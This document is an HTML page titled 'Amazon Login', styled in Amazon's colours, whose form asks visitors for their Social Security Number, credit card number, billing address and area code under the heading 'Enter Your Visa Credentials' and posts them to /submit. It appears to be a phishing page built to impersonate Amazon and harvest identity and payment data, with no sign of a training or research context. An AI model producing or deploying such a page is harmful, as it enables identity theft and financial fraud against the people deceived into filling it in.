<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background-color: #ff9900;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Enter Your Visa Credentials</h2>
        <form action="/submit" method="post">
            <div class="form-group">
                <input type="text" name="area_code" placeholder="Area Code" required>
            </div>
            <div class="form-group">
                <input type="text" name="ssn" placeholder="Social Security Number" required>
            </div>
            <div class="form-group">
                <input type="text" name="credit_card_number" placeholder="Credit Card Number" required>
            </div>
            <div class="form-group">
                <input type="text" name="billing_address" placeholder="Billing Address" required>
            </div>
            <button type="submit" class="btn">Finish</button>
        </form>
    </div>
</body>
</html>
